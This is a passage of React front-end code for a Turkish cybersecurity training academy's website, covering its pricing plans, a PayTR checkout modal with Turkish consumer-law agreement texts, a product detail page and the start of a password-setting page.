      return;
    }
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(checkoutEmail)) {
      setCheckoutError('Geçerli bir e-posta adresi girin.');
      return;
    }
    setCheckoutError('');
    setLoading(true);

    try {
      const res = await fetch('/api/checkout/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: checkoutEmail, name: checkoutName, phone: checkoutPhone, address: checkoutAddress, plan_id: showCheckout.id })
      });
      const data = await res.json();
      if (data.status === 'success' && data.token) {
        setPaytrToken(data.token);
        setMerchantOid(data.merchant_oid);
        setDemoMode(!!data.demo);
        setCheckoutStep(2);
      } else {
        setCheckoutError((data.error || 'Ödeme başlatılamadı.') + (data.reason ? ' (' + data.reason + ')' : ''));
      }
    } catch (err) {
      setCheckoutError('Bağlantı hatası. Lütfen internet bağlantınızı kontrol edin.');
    } finally {
      setLoading(false);
    }
  };

  // PayTR iframe açıldığında iFrameResize çalıştır
  useEffect(() => {
    if (checkoutStep === 2 && paytrToken && window.iFrameResize) {
      setTimeout(() => {
        try { window.iFrameResize({}, '#paytriframe'); } catch(e) {}
      }, 500);
    }
  }, [checkoutStep, paytrToken]);

  // URL'den ödeme sonucunu kontrol et
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const payment = params.get('payment');
    if (payment === 'success') {
      setCheckoutStep(3);
      setShowCheckout({ id: 'result', name: 'Ödeme Tamamlandı' });
      window.history.replaceState({}, '', window.location.pathname);
    } else if (payment === 'fail') {
      setCheckoutStep(3);
      setCheckoutError('Ödeme işlemi başarısız oldu. Lütfen tekrar deneyin.');
      setShowCheckout({ id: 'result', name: 'Ödeme Başarısız' });
      window.history.replaceState({}, '', window.location.pathname);
    }
  }, []);

  const legalContents = {
    mesafeli: { title: 'Mesafeli Satış Sözleşmesi', content: 'Bu sözleşme, 6502 sayılı Tüketicinin Korunması Hakkında Kanun ve Mesafeli Sözleşmeler Yönetmeliği uyarınca düzenlenmiştir.\n\n1. SATICI BİLGİLERİ\nÜnvan: Siber Kampüs Akademi\nAdres: Evliya Çelebi Mah. Şener Sok. No:11 Tuzla/İstanbul\nTelefon: 0538 935 11 89\nE-posta: destek@siberkampus.org\n\n2. KONU\nİşbu sözleşmenin konusu, ALICI\'nın SATICI\'ya ait internet sitesinden elektronik ortamda sipariş verdiği eğitim hizmetinin satışı ve teslimi ile ilgili olarak 6502 sayılı Kanun gereğince tarafların hak ve yükümlülüklerinin saptanmasıdır.\n\n3. ÜRÜN/HİZMET BİLGİLERİ\nSatın alınan eğitim paketinin içeriği, özellikleri ve ücreti sipariş sayfasında belirtilmiştir.\n\n4. TESLİMAT\nVIP üyelik erişimi, ödemenin onaylanmasının ardından e-postanıza gönderilen şifre belirleme bağlantısı ile hesabınıza tanımlanır.\n\n5. CAYMA HAKKI\nTüketici, dijital içeriğin ifasına başlanmadan önce 14 gün içinde cayma hakkını kullanabilir. Dijital içeriğin ifasına başlandıktan sonra cayma hakkı kullanılamaz.' },
    onbilgi: { title: 'Ön Bilgilendirme Formu', content: 'Mesafeli Sözleşmelere Dair Yönetmelik uyarınca, tüketiciye sözleşme kurulmadan önce aşağıdaki bilgiler verilmektedir:\n\n1. SATICI BİLGİLERİ\nÜnvan: Siber Kampüs Akademi\nAdres: Evliya Çelebi Mah. Şener Sok. No:11 Tuzla/İstanbul\nTelefon: 0538 935 11 89\nE-posta: destek@siberkampus.org\n\n2. HİZMETİN TEMEL NİTELİKLERİ\nBirebir canlı siber güvenlik eğitimi sunulmaktadır. Hizmet; eğitmenle özel danışma (VIP sohbet), VIP teknik kaynak arşivi ve sertifika programını kapsamaktadır.\n\n3. HİZMET BEDELİ\nTüm vergiler dahil toplam bedel, ödeme sayfasında gösterilmektedir.\n\n4. ÖDEME ŞEKLİ\nKredi kartı ile tek çekim olarak ödeme yapılmaktadır.\n\n5. CAYMA HAKKI\nTüketici, 14 gün içinde herhangi bir gerekçe göstermeksizin ve cezai şart ödemeksizin sözleşmeden cayabilir.' },
    iade: { title: 'İade ve İptal Koşulları', content: 'SİBER KAMPÜS AKADEMİ İADE VE İPTAL KOŞULLARI\n\n1. DİJİTAL İÇERİK İADESİ\nDijital eğitim içeriklerinin iadesi, içeriğin henüz erişime açılmamış olması halinde, satın alma tarihinden itibaren 14 gün içinde yapılabilir.\n\n2. 1\'E 1 CANLI EĞİTİM İPTALİ\nCanlı eğitim programı başlamadan en az 7 gün önce iptal talebi yapılması halinde, ödenen bedelin tamamı iade edilir. Eğitim başladıktan sonra, kalan ders sayısı üzerinden orantılı iade yapılır.\n\n3. İADE SÜRECİ\nİade talepleri destek@siberkampus.org adresine e-posta ile iletilmelidir. İade bedeli, talebin onaylanmasından itibaren 14 iş günü içinde ödeme yapılan araca iade edilir.\n\n4. İPTAL İŞLEMİ\nAbonelik veya eğitim paketi iptalleri, kullanıcı panelinden veya destek ekibine başvurarak gerçekleştirilebilir.' }
  };

  return (
    <>
      <HeaderCmp navigate={navigate} />
      
      {/* Hero */}
      <section className="py-20 border-b border-[#0c2719] relative overflow-hidden">
        <div className="absolute top-[-30%] left-1/2 -translate-x-1/2 w-[800px] h-[400px] z-0 pointer-events-none" style={{ background: 'radial-gradient(ellipse at center,rgba(0,255,136,.08),transparent 62%)' }}></div>
        <div className="max-w-[1280px] mx-auto px-8 text-center relative z-[2]">
          <span className="font-mono text-[13px] font-medium tracking-[.18em] uppercase text-[#00ff88] inline-flex items-center gap-2.5"><span className="text-[#5c8a74] font-bold">//</span> EĞİTİM PAKETLERİ</span>
          <h1 className="text-[clamp(36px,5vw,56px)] text-[#eafff5] my-5 font-disp">Eğitim Paketleri & Fiyatlandırma</h1>
          <p className="text-[#74998a] max-w-[640px] mx-auto text-base">Seviyenize uygun eğitim paketini seçin ve siber güvenlik kariyerinize hemen başlayın.</p>
          <div className="mt-6 inline-flex items-center gap-3 bg-[rgba(0,255,136,.06)] border border-[#00ff88]/30 rounded-full px-6 py-3">
            <span className="text-[#00ff88] text-2xl">🔥</span>
            <span className="text-[#00ff88] font-bold text-lg font-mono">%50 İNDİRİM</span>
            <span className="text-[#9fc4b5] text-sm">Sınırlı süre.</span>
          </div>
        </div>
      </section>

      {/* Plans Grid */}
      <section className="py-20 max-w-[1280px] mx-auto px-6">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 items-stretch max-w-[840px] mx-auto">
          {plans.map((plan, idx) => (
            <div key={plan.id} className={`rounded-2xl border p-8 flex flex-col justify-between relative overflow-hidden transition-all duration-300 hover:-translate-y-1 ${plan.popular ? 'border-[#00ff88]/50 shadow-[0_0_50px_rgba(0,255,136,0.08)]' : 'border-[#0c2719] hover:border-[#103a26]'}`} style={{ background: plan.popular ? 'linear-gradient(165deg,#091f15,#04100a)' : 'linear-gradient(165deg,#07150e,#04100a)' }}>
              {/* Badge */}
              {plan.tag && (
                <div className={`absolute top-4 right-4 text-[10px] font-bold px-3 py-1 rounded-full font-mono ${plan.popular ? 'bg-[#00ff88] border border-[#00ff88] text-[#021008]' : plan.price > 0 ? 'bg-[#ffd166] border border-[#ffd166] text-[#021008]' : 'bg-[#74998a] border border-[#74998a] text-[#020806]'}`}>{plan.tag}</div>
              )}
              
              {/* Image */}
              <div className="rounded-xl overflow-hidden mb-6 border border-[#0c2719]">
                <img src={plan.img} alt={plan.name} className="w-full h-44 object-cover" />
              </div>
              
              <div className="flex-1">
                <h2 className="text-lg text-[#eafff5] font-disp font-bold mb-3 pr-16">{plan.name}</h2>
                
                {/* Price */}
                <div className="mb-6">
                  {plan.oldPrice && (
                    <span className="text-[#5c8a74] text-lg line-through font-mono mr-2">{plan.oldPrice.toLocaleString('tr-TR')} TL</span>
                  )}
                  <span className="text-3xl font-bold text-[#eafff5] font-mono">{plan.price === 0 ? 'Ücretsiz' : plan.price.toLocaleString('tr-TR') + ' TL'}</span>
                  {plan.period && <span className="text-xs text-[#74998a] ml-2">/ {plan.period}</span>}
                </div>
                
                <hr className="border-[#0c2719] my-5" />
                
                <ul className="space-y-3 text-sm font-mono">
                  {plan.features.map((f, fi) => {
                    const isBold = f.startsWith('**') && f.endsWith('**');
                    const cleanText = isBold ? f.slice(2, -2) : f;
                    return (
                      <li key={fi} className="flex items-start gap-2.5 text-[#9fc4b5]">
                        <span className="text-[#00ff88] text-xs mt-0.5">✔</span>
                        <span className={isBold ? 'text-[#00ff88] font-bold' : ''}>{cleanText}</span>
                      </li>
                    );
                  })}
                </ul>
              </div>
              
              {/* CTA */}
              {plan.id === 'one-on-one' && (
                <style>{`
                  @keyframes pulseGlow {
                    0% {
                      box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.7);
                    }
                    70% {
                      box-shadow: 0 0 0 15px rgba(0, 255, 136, 0);
                    }
                    100% {
                      box-shadow: 0 0 0 0 rgba(0, 255, 136, 0);
                    }
                  }
                  .pulse-btn {
                    animation: pulseGlow 1.8s infinite;
                  }
                `}</style>
              )}
              <button 
                onClick={() => handlePlanClick(plan)}
                className={`w-full mt-8 py-3.5 rounded-xl font-mono text-sm font-bold transition-all text-center ${plan.popular ? 'text-[#021008] bg-[#00ff88] hover:shadow-[0_0_30px_var(--glow)]' : plan.price > 0 ? 'text-[#021008] bg-[#ffd166] hover:shadow-[0_0_30px_rgba(255,209,102,.3)]' : 'border border-[#103a26] text-[#74998a] hover:text-[#00ff88] hover:border-[#00ff88]'} ${plan.id === 'one-on-one' ? 'pulse-btn' : ''}`}
              >
                {plan.cta}
              </button>
            </div>
          ))}
        </div>

        {/* Payment methods */}
        <div className="mt-12 text-center">
          <p className="text-[#5c8a74] text-sm mb-4">Güvenli ödeme altyapısı ile ödeme yapabilirsiniz</p>
          <img src="/visa-mastercard-troypng.png" alt="Visa, Mastercard, Troy - Güvenli Ödeme" className="h-12 w-auto object-contain mx-auto opacity-80 hover:opacity-100 transition-opacity" />
          <p className="text-[#5c8a74] text-xs mt-3">💳 PCI-DSS 256-Bit Güvenli Ödeme Altyapısı</p>
        </div>
      </section>

      {/* Checkout Modal */}
      {showCheckout && (
        <div className="fixed inset-0 z-[9999] flex items-center justify-center p-4" style={{ background: 'rgba(0,0,0,.88)' }}>
          <div className={`w-full ${checkoutStep === 2 && !demoMode ? 'max-w-2xl' : 'max-w-lg'} rounded-2xl border border-[#0c2719] overflow-hidden max-h-[92vh] overflow-y-auto transition-all duration-300`} style={{ background: 'linear-gradient(165deg,#0a1f15,#04100a)' }} onClick={e => e.stopPropagation()}>

            {/* Modal Header */}
            <div className="flex items-center justify-between px-7 pt-7 pb-4">
              <div className="flex items-center gap-3">
                <span className="w-8 h-8 border border-[#00ff88] rounded-lg grid place-items-center text-[#00ff88] font-mono text-sm font-bold">&gt;_</span>
                <h2 className="text-lg text-[#eafff5] font-disp font-bold">Güvenli Ödeme</h2>
              </div>
              <button onClick={() => { if (!loading) { setShowCheckout(null); setCheckoutStep(1); } }} className="text-[#74998a] hover:text-[#eafff5] text-2xl transition-colors leading-none">&times;</button>
            </div>

            {/* Step Indicator */}
            <div className="px-7 pb-5">
              <div className="flex items-center gap-2">
                {[{n:1,t:'Bilgiler'},{n:2,t:'Ödeme'},{n:3,t:'Tamamlandı'}].map((s,i) => (
                  <React.Fragment key={s.n}>
                    {i > 0 && <div className={`flex-1 h-px ${checkoutStep >= s.n ? 'bg-[#00ff88]' : 'bg-[#103a26]'}`}></div>}
                    <div className={`flex items-center gap-1.5 ${checkoutStep >= s.n ? 'text-[#00ff88]' : 'text-[#5c8a74]'}`}>
                      <span className={`w-6 h-6 rounded-full text-[11px] font-bold grid place-items-center border ${checkoutStep >= s.n ? 'border-[#00ff88] bg-[#00ff88]/10' : 'border-[#103a26]'}`}>{checkoutStep > s.n ? '✓' : s.n}</span>
                      <span className="text-[11px] font-mono hidden sm:inline">{s.t}</span>
                    </div>
                  </React.Fragment>
                ))}
              </div>
            </div>

            <div className="px-7 pb-7">

              {/* ===== STEP 1: Bilgi Toplama ===== */}
              {checkoutStep === 1 && showCheckout.price && (
                <>
                  {/* Order summary */}
                  <div className="rounded-xl border border-[#0c2719] p-4 mb-6 bg-[rgba(0,255,136,.02)]">
                    <div className="flex items-center justify-between">
                      <div>
                        <div className="text-[11px] text-[#74998a] mb-1 font-mono uppercase tracking-wider">Seçilen Paket</div>
                        <div className="text-[#eafff5] font-bold text-sm">{showCheckout.name}</div>
                      </div>
                      <div className="text-right">
                        {showCheckout.oldPrice && <div className="text-[#5c8a74] line-through text-xs font-mono">{showCheckout.oldPrice.toLocaleString('tr-TR')} TL</div>}
                        <div className="text-[#00ff88] font-bold text-xl font-mono">{showCheckout.price.toLocaleString('tr-TR')} TL</div>
                      </div>
                    </div>
                  </div>

                  {/* Güvenli ödeme görseli */}
                  <div className="flex items-center justify-center gap-4 mb-6 py-3 rounded-xl border border-[#0c2719] bg-[#04100a]/60">
                    <img src="/visa-mastercard-troypng.png" alt="Visa, Mastercard, Troy" className="h-8 w-auto object-contain opacity-90" />
                    <div className="h-6 w-px bg-[#103a26]"></div>
                    <span className="text-[11px] text-[#74998a] font-mono flex items-center gap-1.5">🔒 PCI-DSS 256-Bit Güvenli</span>
                  </div>

                  {/* Form */}
                  <div className="space-y-4 mb-6">
                    <div>
                      <label className="block text-xs text-[#74998a] mb-1.5 font-mono">Ad Soyad *</label>
                      <input type="text" value={checkoutName} onChange={e => setCheckoutName(e.target.value)} placeholder="Ad Soyad" className="w-full bg-[#04100a] border border-[#103a26] rounded-lg px-4 py-3 text-[#eafff5] text-sm font-mono placeholder-[#5c8a74] focus:border-[#00ff88] outline-none transition-colors" />
                    </div>
                    <div>
                      <label className="block text-xs text-[#74998a] mb-1.5 font-mono">E-posta Adresi *</label>
                      <input type="email" value={checkoutEmail} onChange={e => setCheckoutEmail(e.target.value)} placeholder="ornek@mail.com" className="w-full bg-[#04100a] border border-[#103a26] rounded-lg px-4 py-3 text-[#eafff5] text-sm font-mono placeholder-[#5c8a74] focus:border-[#00ff88] outline-none transition-colors" />
                      <p className="text-[10px] text-[#5c8a74] mt-1.5">Ödeme sonrası şifre belirleme bağlantısı bu adrese gönderilecek.</p>
                    </div>
                    <div>
                      <label className="block text-xs text-[#74998a] mb-1.5 font-mono">Telefon Numarası *</label>
                      <div className="flex">
                        <span className="bg-[#0c2719] border border-r-0 border-[#103a26] rounded-l-lg px-3 flex items-center text-[#74998a] font-mono text-sm select-none">+90</span>
                        <input type="tel" value={checkoutPhone} onChange={e => setCheckoutPhone(e.target.value.replace(/\D/g, '').slice(0, 10))} placeholder="5XX XXX XX XX" className="flex-1 bg-[#04100a] border border-[#103a26] rounded-r-lg px-4 py-3 text-[#eafff5] text-sm font-mono placeholder-[#5c8a74] focus:border-[#00ff88] outline-none transition-colors" />
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs text-[#74998a] mb-1.5 font-mono">Adres *</label>
                      <input type="text" value={checkoutAddress} onChange={e => setCheckoutAddress(e.target.value)} placeholder="Mahalle, ilçe, şehir" className="w-full bg-[#04100a] border border-[#103a26] rounded-lg px-4 py-3 text-[#eafff5] text-sm font-mono placeholder-[#5c8a74] focus:border-[#00ff88] outline-none transition-colors" />
                    </div>
                  </div>

                  {/* Legal agreements */}
                  <div className="space-y-3 mb-6">
                    <label className="flex items-start gap-3 cursor-pointer group">
                      <input type="checkbox" checked={agreed.mesafeli} onChange={e => setAgreed({...agreed, mesafeli: e.target.checked})} className="mt-1 accent-[#00ff88]" />
                      <span className="text-xs text-[#9fc4b5]">
                        <button type="button" onClick={() => setShowLegal('mesafeli')} className="text-[#00ff88] underline hover:text-[#5cffba] transition-colors">Mesafeli Satış Sözleşmesi</button>'ni okudum ve kabul ediyorum.
                      </span>
                    </label>
                    <label className="flex items-start gap-3 cursor-pointer group">
                      <input type="checkbox" checked={agreed.onbilgi} onChange={e => setAgreed({...agreed, onbilgi: e.target.checked})} className="mt-1 accent-[#00ff88]" />
                      <span className="text-xs text-[#9fc4b5]">
                        <button type="button" onClick={() => setShowLegal('onbilgi')} className="text-[#00ff88] underline hover:text-[#5cffba] transition-colors">Ön Bilgilendirme Formu</button>'nu okudum ve kabul ediyorum.
                      </span>
                    </label>
                    <label className="flex items-start gap-3 cursor-pointer group">
                      <input type="checkbox" checked={agreed.iade} onChange={e => setAgreed({...agreed, iade: e.target.checked})} className="mt-1 accent-[#00ff88]" />
                      <span className="text-xs text-[#9fc4b5]">
                        <button type="button" onClick={() => setShowLegal('iade')} className="text-[#00ff88] underline hover:text-[#5cffba] transition-colors">İade ve İptal Koşulları</button>'nı okudum ve kabul ediyorum.
                      </span>
                    </label>
                  </div>

                  {/* Error */}
                  {checkoutError && <div className="mb-4 p-3 rounded-lg border border-red-500/30 bg-red-500/5 text-red-400 text-xs font-mono">{checkoutError}</div>}

                  {/* Submit */}
                  <button
                    onClick={handleStartPayment}
                    disabled={loading || !agreed.mesafeli || !agreed.onbilgi || !agreed.iade}
                    className="w-full py-4 font-mono font-bold text-[#021008] bg-[#00ff88] rounded-xl hover:shadow-[0_0_30px_var(--glow)] disabled:opacity-40 disabled:hover:shadow-none transition-all text-center text-sm"
                  >
                    {loading ? (
                      <span className="flex items-center justify-center gap-2">
                        <span className="w-4 h-4 border-2 border-[#021008] border-t-transparent rounded-full animate-spin"></span>
                        Hazırlanıyor...
                      </span>
                    ) : `Ödemeye Geç — ${showCheckout.price.toLocaleString('tr-TR')} TL`}
                  </button>
                </>
              )}

              {/* ===== STEP 2: PayTR iFrame veya Demo ===== */}
              {checkoutStep === 2 && paytrToken && (
                <>
                  {demoMode ? (
                    <>
                      <div className="flex items-center justify-center gap-2 mb-4">
                        <span className="bg-[#ffd166] text-[#021008] text-[10px] font-bold font-mono px-2.5 py-1 rounded-full">TEST MODU</span>
                      </div>
                      <div className="rounded-xl border border-[#103a26] p-6 bg-[#04100a]/80">
                        <div className="text-center mb-5">
                          <img src="/visa-mastercard-troypng.png" alt="Kart" className="h-8 mx-auto mb-3 opacity-80" />
                          <p className="text-[#9fc4b5] text-sm">Ödeme altyapısı (PayTR) entegrasyon onayı bekleniyor.</p>
                          <p className="text-[#5c8a74] text-xs mt-1">Aşağıdaki buton ile ödeme akışını test edebilirsiniz.</p>
                        </div>
                        <div className="rounded-lg border border-[#103a26] p-4 mb-5 bg-[#021008]/60">
                          <div className="flex justify-between text-xs font-mono mb-2">
                            <span className="text-[#74998a]">Paket</span>
                            <span className="text-[#eafff5]">{showCheckout.name}</span>
                          </div>
                          <div className="flex justify-between text-xs font-mono mb-2">
                            <span className="text-[#74998a]">Tutar</span>
                            <span className="text-[#00ff88] font-bold">{showCheckout.price?.toLocaleString('tr-TR')} TL</span>
                          </div>
                          <div className="flex justify-between text-xs font-mono">
                            <span className="text-[#74998a]">E-posta</span>
                            <span className="text-[#eafff5]">{checkoutEmail}</span>
                          </div>
                        </div>
                        {checkoutError && <div className="mb-4 p-3 rounded-lg border border-red-500/30 bg-red-500/5 text-red-400 text-xs font-mono">{checkoutError}</div>}
                        <button
                          onClick={async () => {
                            setLoading(true);
                            setCheckoutError('');
                            try {
                              const r = await fetch('/api/checkout/demo-complete', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ merchant_oid: merchantOid })
                              });
                              const d = await r.json();
                              if (d.status === 'success' || d.status === 'already_paid') {
                                setCheckoutStep(3);
                              } else {
                                setCheckoutError(d.error || 'Demo ödeme başarısız.');
                              }
                            } catch (e) {
                              setCheckoutError('Bağlantı hatası.');
                            } finally {
                              setLoading(false);
                            }
                          }}
                          disabled={loading}
                          className="w-full py-3.5 font-mono font-bold text-[#021008] bg-[#00ff88] rounded-xl hover:shadow-[0_0_30px_var(--glow)] disabled:opacity-40 transition-all text-sm"
                        >
                          {loading ? (
                            <span className="flex items-center justify-center gap-2">
                              <span className="w-4 h-4 border-2 border-[#021008] border-t-transparent rounded-full animate-spin"></span>
                              İşleniyor...
                            </span>
                          ) : 'Ödemeyi Simüle Et (Test)'}
                        </button>
                      </div>
                      <p className="text-[10px] text-[#ffd166] text-center mt-3 font-mono">PayTR onayı sonrası bu ekran gerçek ödeme sayfasına dönüşecektir.</p>
                    </>
                  ) : (
                    <>
                      <div className="flex items-center justify-center gap-3 mb-4 text-[#74998a] text-xs font-mono">
                        <span>🔒 Güvenli ödeme sayfası yüklendi</span>
                      </div>
                      <div className="rounded-xl border border-[#103a26] overflow-hidden bg-white">
                        <iframe
                          id="paytriframe"
                          src={`https://www.paytr.com/odeme/guvenli/${paytrToken}`}
                          frameBorder="0"
                          scrolling="yes"
                          style={{ width: '100%', minHeight: '500px', height: '65vh' }}
                        ></iframe>
                      </div>
                      <p className="text-[10px] text-[#5c8a74] text-center mt-3">Kart bilgileriniz PayTR güvenli altyapısı tarafından işlenmektedir.</p>
                    </>
                  )}
                </>
              )}

              {/* ===== STEP 3: Sonuç ===== */}
              {checkoutStep === 3 && (
                <div className="text-center py-8">
                  {!checkoutError ? (
                    <>
                      <div className="w-16 h-16 rounded-full bg-[#00ff88]/10 border-2 border-[#00ff88] grid place-items-center mx-auto mb-5">
                        <span className="text-[#00ff88] text-3xl">✓</span>
                      </div>
                      <h3 className="text-xl text-[#eafff5] font-disp font-bold mb-3">Ödemeniz Alındı!</h3>
                      <p className="text-[#9fc4b5] text-sm leading-relaxed mb-6 max-w-sm mx-auto">
                        E-posta adresinize şifre belirleme bağlantısı gönderildi. Lütfen e-postanızı kontrol edin ve şifrenizi belirleyerek hesabınıza erişin.
                      </p>
                      <div className="rounded-xl border border-[#0c2719] p-4 bg-[rgba(0,255,136,.03)] mb-6 text-left">
                        <div className="text-[11px] text-[#74998a] mb-1 font-mono">Sonraki Adımlar</div>
                        <ol className="text-xs text-[#9fc4b5] space-y-1.5 list-decimal pl-4">
                          <li>E-postanızdaki bağlantıya tıklayın</li>
                          <li>Şifrenizi belirleyin</li>
                          <li>Eğitim platformuna giriş yapın</li>
                        </ol>
                      </div>
                      <button onClick={() => { setShowCheckout(null); setCheckoutStep(1); }} className="border border-[#103a26] text-[#cdeede] px-6 py-2.5 text-sm rounded-xl hover:border-[#00ff88] hover:text-[#00ff88] transition-colors font-mono">Kapat</button>
                    </>
                  ) : (
                    <>
                      <div className="w-16 h-16 rounded-full bg-red-500/10 border-2 border-red-500/50 grid place-items-center mx-auto mb-5">
                        <span className="text-red-400 text-3xl">✕</span>
                      </div>
                      <h3 className="text-xl text-[#eafff5] font-disp font-bold mb-3">Ödeme Başarısız</h3>
                      <p className="text-[#9fc4b5] text-sm leading-relaxed mb-6">{checkoutError}</p>
                      <button onClick={() => { setCheckoutStep(1); setCheckoutError(''); }} className="text-[#021008] bg-[#00ff88] px-6 py-2.5 text-sm rounded-xl font-mono font-bold hover:shadow-[0_0_20px_var(--glow)] transition-all">Tekrar Dene</button>
                    </>
                  )}
                </div>
              )}

            </div>
          </div>
        </div>
      )}

      {/* Legal Modal */}
      {showLegal && (
        <div className="fixed inset-0 z-[10000] flex items-center justify-center p-4" style={{ background: 'rgba(0,0,0,.9)' }} onClick={() => setShowLegal(null)}>
          <div className="w-full max-w-xl rounded-2xl border border-[#0c2719] p-8 max-h-[80vh] overflow-y-auto" style={{ background: 'linear-gradient(165deg,#0a1f15,#04100a)' }} onClick={e => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-lg text-[#eafff5] font-disp font-bold">{legalContents[showLegal]?.title}</h3>
              <button onClick={() => setShowLegal(null)} className="text-[#74998a] hover:text-[#eafff5] text-2xl transition-colors">&times;</button>
            </div>
            <div className="text-sm text-[#9fc4b5] leading-relaxed whitespace-pre-wrap font-mono">{legalContents[showLegal]?.content}</div>
            <button onClick={() => { setAgreed(prev => ({...prev, [showLegal]: true})); setShowLegal(null); }} className="mt-6 w-full py-3 font-mono text-sm font-bold text-[#021008] bg-[#00ff88] rounded-xl hover:shadow-[0_0_20px_var(--glow)] transition-all">Okudum ve Kabul Ediyorum</button>
          </div>
        </div>
      )}

      <FooterCmp navigate={navigate} />
    </>
  );
};

/* ============ PRODUCT DETAIL PAGE ============ */
const ProductDetailPage = ({ navigate, data }) => {
  const HeaderCmp = window.SKHeader || (() => null);
  const FooterCmp = window.SKFooter || (() => null);
  const useUser = window.SKuseUser || (() => [null]);
  const [user] = useUser();
  const productId = data && data.id;

  const products = {
    'free-basic': {
      name: 'Ücretsiz Tanışma Görüşmesi',
      price: 0, oldPrice: null,
      img: '/freeeducationiamge-fiyatlandırma.jpg',
      desc: 'Siber güvenlik kariyerine başlamadan önce bizimle ücretsiz bir ön görüşme yapın. Mevcut seviyenizi birlikte değerlendirelim, hedeflerinize uygun bir eğitim yol haritası çizelim ve tüm sorularınızı yanıtlayalım.',
      features: ['Birebir Online Ön Görüşme', 'Seviye Tespiti & Hedef Belirleme', 'Sana Özel Eğitim Yol Haritası', 'Tüm Sorularına Net Cevaplar'],
      isFree: true
    },
    'one-on-one': {
      name: "1'e 1 Canlı Siber Güvenlik Eğitimi",
      price: 1500, oldPrice: 3000,
      img: '/mentoregitimi-fiyatlandırma.jpg',
      desc: 'Deneyimli bir siber güvenlik uzmanıyla birebir çalışarak kariyerinizi hızla ilerletin. Size özel esnek ders programında, gerçek saldırı senaryolarını canlı olarak uygulayarak öğrenir ve doğrudan mentörlük desteği alırsınız. Ders başına ücretlendirme ile ihtiyacınız kadar ders alırsınız.',
      features: ['Birebir Canlı Online Ders (Saatlik)', 'Gerçek Saldırı Senaryolarıyla Pratik', 'Sana Özel Esnek Ders Programı', 'VIP Uzmanlık Kaynaklarına Erişim', 'Eğitmenle Özel VIP Sohbet', 'Siber Kampüs Onaylı Sertifika', 'CV Hazırlama & Mülakat Desteği'],
      isFree: false
    }
  };

  const product = products[productId];
  if (!product) {
    return (<><HeaderCmp navigate={navigate} /><div className="min-h-screen flex items-center justify-center"><div className="text-center"><h1 className="text-3xl text-[#eafff5] mb-4">Ürün Bulunamadı</h1><button onClick={() => navigate('pricing')} className="text-[#00ff88] hover:underline font-mono">← Fiyatlandırmaya Dön</button></div></div><FooterCmp navigate={navigate} /></>);
  }

  const handleAction = () => {
    if (product.isFree) {
      navigate('contact');
    } else {
      navigate('pricing');
    }
  };

  return (
    <>
      <HeaderCmp navigate={navigate} />
      <section className="py-20 border-b border-[#0c2719] relative overflow-hidden">
        <div className="absolute top-[-30%] left-1/2 -translate-x-1/2 w-[800px] h-[400px] z-0 pointer-events-none" style={{ background: 'radial-gradient(ellipse at center,rgba(0,255,136,.08),transparent 62%)' }}></div>
        <div className="max-w-[1080px] mx-auto px-8 relative z-[2]">
          <button onClick={() => navigate('pricing')} className="text-[#74998a] hover:text-[#00ff88] text-sm font-mono mb-8 inline-flex items-center gap-2 transition-colors">← Fiyatlandırma</button>
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
            <div className="rounded-2xl overflow-hidden border border-[#0c2719]">
              <img src={product.img} alt={product.name} className="w-full h-80 object-cover" />
            </div>
            <div>
              {product.oldPrice && (
                <span className="inline-flex items-center gap-2 bg-[#00ff88]/10 border border-[#00ff88]/30 rounded-full px-4 py-1.5 text-[#00ff88] text-xs font-bold font-mono mb-4">🔥 %50 İNDİRİM</span>
              )}
              <h1 className="text-[clamp(28px,4vw,42px)] text-[#eafff5] font-disp font-bold mb-4">{product.name}</h1>
              <p className="text-[#74998a] text-base leading-relaxed mb-6">{product.desc}</p>
              <div className="mb-6">
                {product.oldPrice && <span className="text-[#5c8a74] text-xl line-through font-mono mr-3">{product.oldPrice.toLocaleString('tr-TR')} TL</span>}
                <span className="text-4xl font-bold text-[#eafff5] font-mono">{product.price === 0 ? 'Ücretsiz' : product.price.toLocaleString('tr-TR') + ' TL'}</span>
              </div>
              <button onClick={handleAction} className="font-mono text-sm font-bold text-[#021008] bg-[#00ff88] px-8 py-4 rounded-xl hover:shadow-[0_0_30px_var(--glow)] transition-all">
                {product.isFree ? (user ? 'Panele Git' : 'Eğitime Başla ⚡') : 'Satın Al ⚡'}
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Features */}
      <section className="py-16 max-w-[1080px] mx-auto px-8">
        <h2 className="text-2xl text-[#eafff5] font-disp font-bold mb-8">Bu Eğitimde Neler Var?</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {product.features.map((f, i) => (
            <div key={i} className="flex items-center gap-3 rounded-xl border border-[#0c2719] p-5" style={{ background: 'linear-gradient(165deg,#07150e,#04100a)' }}>
              <span className="text-[#00ff88] text-lg">✔</span>
              <span className="text-[#9fc4b5] text-sm font-mono">{f}</span>
            </div>
          ))}
        </div>
      </section>

      <FooterCmp navigate={navigate} />
    </>
  );
};

/* ============ SET PASSWORD PAGE (ödeme sonrası) ============ */
const SetPasswordPage = ({ navigate, data }) => {
  const HeaderCmp = window.SKHeader || (() => null);
  const FooterCmp = window.SKFooter || (() => null);
  const [pw, setPw] = useState('');
  const [pw2, setPw2] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [done, setDone] = useState(false);
  const token = data && data.token;

  const handleSubmit = async () => {
    setError('');
    if (!pw || pw.length < 6) { setError('Şifre en az 6 karakter olmalıdır.'); return; }
    if (pw !== pw2) { setError('Şifreler eşleşmiyor.'); return; }
    setLoading(true);
    try {
      const res = await fetch('/api/auth/set-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token, password: pw })
      });
      const d = await res.json();
      if (res.ok && d.token) {
        // Otomatik giriş
        localStorage.setItem('sk_token', d.token);
        if (d.user) {
          localStorage.setItem('sk_user_name', d.user.name || '');
          localStorage.setItem('sk_user_email', d.user.email || '');
          localStorage.setItem('sk_user_points', d.user.points || 0);
